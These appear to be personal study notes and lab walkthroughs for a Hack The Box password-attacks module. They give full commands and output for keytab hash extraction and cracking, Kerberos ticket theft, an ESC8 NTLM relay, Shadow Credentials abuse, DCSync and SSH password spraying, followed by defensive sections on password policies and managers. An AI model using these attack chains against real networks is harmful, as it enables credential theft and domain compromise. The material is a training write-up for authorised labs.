Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7946.5 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 147456/14344384 (1.03%)
Rejected.........: 0/147456 (0.00%)
Restore.Point....: 139264/14344384 (0.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: katie89 -> mckinley1
Hardware.Mon.#1..: Temp: 46c Util: 13%

Started: Thu Jul 23 10:28:44 2026
Stopped: Thu Jul 23 10:28:47 2026

su - carlos@inlanefreight.htb
> Password5

cat flag.txt
C@rl0s_1$_H3r3
```



#### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

```bash
# Check Carlos' crontab for the keytab reference
crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d

find / -name '*.kt*' -ls 2>/dev/null
   262184      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      246 Jul 23 14:50 /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
   262163      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb       94 Jul 23 14:50 /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

 
# Attacker
python3 -m pyftpdlib --port 2121 --write

# Server
curl -o keytabextract.py ftp://10.10.17.216:2121/keytabextract.py

python3 keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677

hashcat -a 0 -m 1000 7247e8d4387e76996ff3f18a34316fdd /usr/share/wordlists/rockyou.txt

7247e8d4387e76996ff3f18a34316fdd:Password4                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 7247e8d4387e76996ff3f18a34316fdd
Time.Started.....: Thu Jul 23 11:14:13 2026 (0 secs)
Time.Estimated...: Thu Jul 23 11:14:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10125.4 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 196608/14344384 (1.37%)
Rejected.........: 0/196608 (0.00%)
Restore.Point....: 188416/14344384 (1.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: becky101 -> piggy!
Hardware.Mon.#1..: Temp: 65c Util: 14%

Started: Thu Jul 23 11:14:13 2026
Stopped: Thu Jul 23 11:14:15 2026

ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
> Password4

ls
cat flag.txt
Mor3_4cce$$_m0r3_Pr1v$

sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL

sudo su

cd /root
cat flag.txt 
Ro0t_Pwn_K3yT4b

root@linux01:/tmp# ls -lah
total 76K
drwxrwxrwt 13 root                               root                           4.0K Jul 23 15:35 .
drwxr-xr-x 20 root                               root                           4.0K Oct  6  2021 ..
drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .font-unix
drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .ICE-unix
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Jul 23 15:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Jul 23 15:35 krb5cc_647401106_oPTGQV
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 2.9K Jul 23 14:24 krb5cc_647401107_P7I2KK
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1.5K Jul 23 15:29 krb5cc_647401109_aDUUE9
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3.2K Jul 23 15:37 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1.8K Jul 23 14:45 krb5cc_647402606_JXLqlM
drwx------  3 root                               root                           4.0K Jul 23 13:38 snap.lxd
drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-ModemManager.service-ZAXgqi
drwx------  3 root                               root                           4.0K Jul 23 13:38 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-logind.service-7mOKTf
drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-resolved.service-X9Wz4g
drwx------  3 root                               root                           4.0K Jul 23 13:37 systemd-private-84da123b6a8a4566a9b08c4ad0528bc0-systemd-timesyncd.service-Sc8TSi
drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .Test-unix
drwx------  2 root                               root                           4.0K Jul 23 13:37 vmware-root_695-4021718990
drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .X11-unix
drwxrwxrwt  2 root                               root                           4.0K Jul 23 13:37 .XIM-unix
root@linux01:/tmp# cp /tmp/krb5cc_647401106_oPTGQV /root/julio.ccache
root@linux01:/tmp# export KRB5CCNAME=/root/julio.ccache
root@linux01:/tmp# klist
Ticket cache: FILE:/root/julio.ccache
Default principal: julio@INLANEFREIGHT.HTB


cp /tmp/krb5cc_647401106_HRJDux /root/julio.ccache
export KRB5CCNAME=/root/julio.ccache
klist

Ticket cache: FILE:/root/julio.ccache
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 10/08/2022 11:32:01

cp /tmp/krb5cc_647401106_oPTGQV /root/julio.ccache
export KRB5CCNAME=/root/julio.ccache
klist

smbclient //DC01/julio -N
ls
get julio.txt
exit

cat julio.txt
JuL1()_SH@re_fl@g
```



#### Use the LINUX01$ Kerberos ticket to read the flag found in DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```bash
curl -o linikatz.sh ftp://10.10.17.216:2121/linikatz.sh
```

```bash
chmod 777 linikatz.sh
./linikatz.sh

Valid starting       Expires              Service principal
07/23/2026 15:55:01  07/24/2026 01:55:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 07/24/2026 15:55:01
07/23/2026 15:55:01  07/24/2026 01:55:01  ldap/dc01.inlanefreight.htb@
	renew until 07/24/2026 15:55:01
07/23/2026 15:55:01  07/24/2026 01:55:01  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
	renew until 07/24/2026 15:55:01

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Jul 23 15:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Jul 23 13:37 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Jul 23 15:55 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Jul 23 15:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4  2022 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Jul 23 15:50 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Jul 23 15:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Jul 23 15:55 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Jul 23 13:37 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Jul 23 15:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6  2022 /etc/sssd/sssd.conf
I: [vas-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4  2022 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18  2022 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Jul 23 13:37 /etc/krb5.conf
-rw------- 1 root root 2694 Jul 23 13:39 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Jul 23 15:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Jul 23 15:55 /tmp/krb5cc_647401106_KUx29v
-rw------- 1 david@inlanefreight.htb domain users@inlanefreight.htb 2935 Jul 23 14:24 /tmp/krb5cc_647401107_P7I2KK
-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Jul 23 15:29 /tmp/krb5cc_647401109_aDUUE9
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Jul 23 15:57 /tmp/krb5cc_647402606
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1746 Jul 23 14:45 /tmp/krb5cc_647402606_JXLqlM
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
./linikatz.sh: line 358: tdbdump: command not found
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB

export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
klist

smbclient //DC01/linux01 -N
ls
get flag.txt
exit

cat flag.txt
```



#### Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.



#### From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.



# Pass the Certificate

PKINIT (Public Key Cryptography for Initial Authentication) is a Kerberos extension enabling public key cryptography during initial auth, typically for smart card logons. Pass-the-Certificate is the technique of using X.509 certificates to obtain TGTs, mainly used alongside AD CS attacks and Shadow Credentials.

## AD CS NTLM Relay Attack (ESC8)

ESC8 is an NTLM relay attack targeting an ADCS HTTP web enrollment endpoint (default `/CertSrv`). A CA allowing web enrollment hosts the app at `/CertSrv`.

Relay inbound connections to the web enrollment service:

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

The `--template` value varies per environment (it's the cert template DCs use for authentication); enumerate it with certipy.

Coerce a machine account to authenticate against your host using the printer bug (requires Print Spooler running on target). Forces DC01 to authenticate to the attacker:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

ntlmrelayx relays the auth, issues a certificate for `DC01$` and writes it to `./DC01$.pfx`. 

Now perform Pass-the-Certificate to get a TGT as DC01$ using gettgtpkinit.py. Clone and set up:

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

If you hit "Error detecting the version of libcrypto", fix with:

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

Request the TGT:

```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

With the TGT, you're back in Pass-the-Ticket territory. As the DC machine account, run DCSync to dump the Administrator hash:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```



## Shadow Credentials (msDS-KeyCredentialLink)

Abuses the `msDS-KeyCredentialLink` attribute, which stores public keys usable for PKINIT auth. In BloodHound, the AddKeyCredentialLink edge means one user can write to another's `msDS-KeyCredentialLink` and take control.

Use pywhisker to generate an X.509 cert and write the public key to the victim's attribute:

```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

This outputs a PFX file and its password. Use them with gettgtpkinit.py to get a TGT as the victim:

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

Pass the ticket and verify:

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

If the victim is in Remote Management Users, connect via WinRM with Kerberos (ensure `krb5.conf` is configured):

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```



## NO PKINIT?

If you can obtain a cert but can't use it for pre-auth (KDC doesn't support the appropriate EKU), use PassTheCert to authenticate against LDAPS with the certificate and perform attacks like changing passwords or granting DCSync rights. Out of scope for this module. 

## Onwards

Next focus: password management. Practice these lateral movement techniques until they're second nature -- a broad toolset is critical during assessments.

## Connect to HTB

> Authenticate to with user "wwhite" and password "package5shores_topher1"

```bash
# In the 1st terminal
source venv/bin/activate
cd impacket
pip install --upgrade pip setuptools wheel
python3 setup.py install

# In the 2nd terminal
source venv/bin/activate
cd impacket
wget https://github.com/fortra/impacket/raw/refs/heads/master/examples/ntlmrelayx.py

sudo $(which ntlmrelayx.py) -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# In the 3rd terminal
source venv/bin/activate
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py

python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.172 10.10.17.216

```

```bash
cd ~
git clone https://github.com/dirkjanm/PKINITtools.git
source ~/impacket/venv/bin/activate
pip install -r PKINITtools/requirements.txt

python3 PKINITtools/gettgtpkinit.py -cert-pfx ~/impacket/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

pip3 install -I git+https://github.com/wbond/oscrypto.git
python3 PKINITtools/gettgtpkinit.py -cert-pfx ~/impacket/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
2026-07-26 19:44:24,763 minikerberos INFO     Loading certificate and key from file
2026-07-26 19:44:25,229 minikerberos INFO     Requesting TGT
2026-07-26 19:44:36,966 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-07-26 19:44:36,966 minikerberos INFO     0c3eb020c5d7f17a98da8882509cdd47181b549ca14600de45673ff0c565ce46
2026-07-26 19:44:36,982 minikerberos INFO     Saved TGT to file

export KRB5CCNAME=/tmp/dc.ccache
secretsdump.py -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
Impacket v0.14.0.dev0+20260528.131215.b27827ae - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
Administrator:des-cbc-md5:a1f262b50b64c46b
[*] Cleaning up... 

cd evil-winrm-py
evil-winrm -u Administrator -i 10.129.234.174 -H fd02e525dd676fd8ca04e200d265f20c
```



#### What are the contents of flag.txt on jpinkman's desktop?

```bash
git clone https://github.com/ShutdownRepo/pywhisker
source venv/bin/activate
pip3 install -r pywhisker/requirements.txt
cd pywhisker
python3 setup.py install

python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e4d239f3-643a-978b-549d-49ea6feecc9e
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: EF9QFWz5.pfx
[+] PFX exportiert nach: EF9QFWz5.pfx
[i] Passwort für PFX: e4uDmK4d7lokho7Uu7tg
[+] Saved PFX (#PKCS12) certificate & key at path: EF9QFWz5.pfx
[*] Must be used with password: e4uDmK4d7lokho7Uu7tg
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

python3 ~/PKINITtools/gettgtpkinit.py -cert-pfx ./EF9QFWz5.pfx -pfx-pass 'e4uDmK4d7lokho7Uu7tg' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

export KRB5CCNAME=/tmp/jpinkman.ccache
klist
Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
07/26/2026 20:09:57  07/27/2026 06:09:57  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL

sudo nano /etc/krb5.conf

[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = 10.129.234.174
        default_domain = inlanefreight.local
    }
[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL

cd evil-winrm-py
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
cd ..
cd Desktop 
more flag.txt
3d7e3dfb56b200ef715cfc300f07f3f8
```



# Password Policies

After learning how to capture credentials, the focus shifts to protecting them. Just as traffic laws keep driving safe, password policies keep users from acting without security constraints. Two components matter: the definition of the policy (the rules for password creation) and its enforcement (the technology that ensures compliance). Both are essential.

The running example: Mark, a non-IT employee, tries to set his password to password123, gets rejected for not meeting the policy, and is shown the minimum requirements.

## Password policy

A password policy is a set of rules that encourages users to create strong passwords and use them appropriately per the organization's standards. Its scope covers the entire password lifecycle — creation, storage, management, and transmission — not just minimum requirements.

## Password policy standards

Many companies follow established IT security standards for compliance and best practice. Adhering to them defines a security baseline but doesn't guarantee full security, and compliance alone shouldn't be the only measure of security controls. Common standards with password guidance:

- NIST SP800-63B
- CIS Password Policy Guide
- PCI DSS

These differ on key points — password expiration being a notable example. The old advice of "change your password every 90 days" has shifted: the industry now often recommends disabling password expiration, since forced changes push users toward predictable, weak patterns.

## Sample password policy

An example policy requiring all passwords to:

- Be a minimum of 8 characters
- Include uppercase and lowercase letters
- Include at least one number
- Include at least one special character
- Not be the username
- Be changed every 60 days

Mark now picks Inlanefreight01!, which passes — but it's still weak because it contains the company name (a common, attacker-known pattern from the "Password Mutations" section). At expiration, he can just change 01 to 02 and still comply, which is why the effectiveness of expiration policies is debated.

Policies should therefore blacklist certain words, including: the company name, common words associated with the company, month names, season names, variations of "welcome" and "password", and easily guessable strings like password, 123456, abcde.

## Enforcing password policy

A policy must be enforced using available technology (or by acquiring the right tools). Most applications and identity management systems support enforcement — for example, with Active Directory you can configure an Active Directory Password Policy GPO. Once the technical side is covered, the policy must be communicated across the company, with processes and procedures to ensure it's applied everywhere.

## Creating a strong password

Strong passwords don't have to be hard. Tools like PasswordMonster evaluate password strength, and the 1Password Password Generator creates secure ones. A generated password like `CjDC2x[U` is strong and resistant to guessing/spraying, but hard to remember.

An alternative is using ordinary words, phrases, or song lyrics — e.g. `The name of my dog is Popy` — optionally with added special characters like `()The name of my dog is Popy!`. These are hard to guess yet memorable, though you should stay aware that attackers use OSINT to learn personal details. This method works for a few passwords, but as they multiply it becomes hard to manage them all — which leads into the next topic: password managers.

# Password Managers

Passwords are everywhere -- Wi-Fi, social media, banking, email, apps. A NordPass study found the average person has around 100 passwords, which drives people to reuse them or make them too simple. The realistic solution is a password manager: an app that stores passwords and sensitive info in an encrypted database. Beyond storage, they offer password generation, 2FA support, secure from filling, browser integration, multi-device sync, security alerts, and more.

## How does a password manager work?

Implementations vary by provider, but most use a master password to encrypt the database. Encryption and authentication rely on cryptographic hash functions and key derivation functions to prevent unauthorized access. The exact mechanisms depend on the provider and whether the manager is cloud-based or local.

## Cloud password managers

Since the average person has three or four devices, a cloud-based manager syncs the encrypted database across all of them, typically providing a mobile app and a browser add-on. Each vendor implements security differently and usually publishes a technical whitepaper (e.g. Bitwarden, 1Password, LastPass).

A common design derives encryption keys from the master password, enabling Zero-Knowledge Encryption -- meaning not even the provider can access your data. Using Bitwarden as the example:

- Master key: derived from the master password via a key derivation function. 
- Master password hash: generated from the master password (often plus the master key) to authenticate the user to the cloud service.
- Decryption key: created from the master key to forma symmetric key, used to decrypt vault items.

(Bitwarden uses PBKDF2-SHA256 for derivation and AES-256 for decryption.) This is simplified — real implementations are more complex. Popular cloud managers: 1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass, RoboForm.

## Local password managers

Some prefer not to rely on third parties and instead store the database locally, taking on responsibility for protecting it. (Dashlane's "Cloud vs. Local" blog post is a useful starting point — noting that local isn't automatically more secure, since cybersecurity isn't that simple.)

Local managers use similar encryption to cloud ones; the main difference is in data transmission and authentication. They focus on securing the locally stored database with cryptographic hash functions and key derivation functions with random salt (to block precomputed keys and hinder dictionary/guessing attacks). Some add memory protection and keylogger resistance via a secure desktop environment, similar to Windows UAC. Popular local managers: KeePass, KWalletManager, Pleasant Password Server, Password Safe.

## Features

To pick the right manager, match features to your needs (e.g. Linux/Android/Chrome OS, sync across devices, 2FA, a $5/month budget). Wikipedia lists online and offline managers with their capabilities. Common features:

- 2FA support
- Multi-platform (Android, iOS, Windows, Linux, Mac, etc.)
- Browser extension
- Login autocomplete
- Import and export
- Password generation



## Alternatives

Passwords are the most common authentication method but not the only one — and they're vulnerable to cracking, guessing, shoulder surfing, and more. Most OSes and apps default to passwords, but admins can adopt third-party identity providers to strengthen protection. Common alternatives:

- Multi-factor Authentication (MFA)
- FIDO2 — an open standard for passwordless logins using physical devices like a YubiKey
- One-Time Passwords (OTP)
- Time-Based One-Time Passwords (TOTP)
- IP restrictions
- Device compliance enforcement via tools like Microsoft Endpoint Manager or - Workspace ONE



## Going passwordless

Companies like Microsoft, Auth0, Okta, and Ping Identity are pushing for a passwordless future. A password is a knowledge factor (something you know), which is vulnerable to theft, sharing, reuse, and misuse. Passwordless authentication replaces it with a possession factor (something you have) or an inherent factor (something you are), verifying identity with greater assurance. As these standards evolve, it's worth understanding their implementation details to judge whether they meet your security needs.

There are many options for protecting passwords; the right choice depends on the individual or organization's needs, and it's common to use different methods for different purposes.

# Skills Assessment
## The Credential Theft Shuffle
The Credential Theft Shuffle, as coined by Sean Metcalf, is a systematic approach attackers use to compromise Active Directory environments by exploiting stolen credentials. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to move laterally across the network. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and gain control over the domain, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the Local Administrator Password Solution (LAPS), enforcing multi-factor authentication, and restricting administrative privileges to mitigate such attacks.

## Skills Assessment
Betty Jayde works at Nexura LLC. We know she uses the password Texas123!@# on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:


| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |


### Pivoting Primer
The internal hosts (JUMP01, FILE01, DC01) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is DMZ01, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on DMZ01. From there, we can pivot — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module cheatsheet for the necessary commands to set up the pivot and continue your assessment.

## Connect to HTB
#### What is the NTLM hash of NEXURA\Administrator?
```bash
nmap -p- -sV 10.129.234.116 --min-rate 5000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-28 09:15 -04
Warning: 10.129.234.116 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.234.116
Host is up (0.14s latency).
Not shown: 65432 closed tcp ports (conn-refused), 102 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds

cd username-anarchy
nano betty.txt
> Betty Jayde
./username-anarchy -i betty.txt > betty_usernames.txt

hydra -L username-anarchy/betty_usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-28 09:21:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
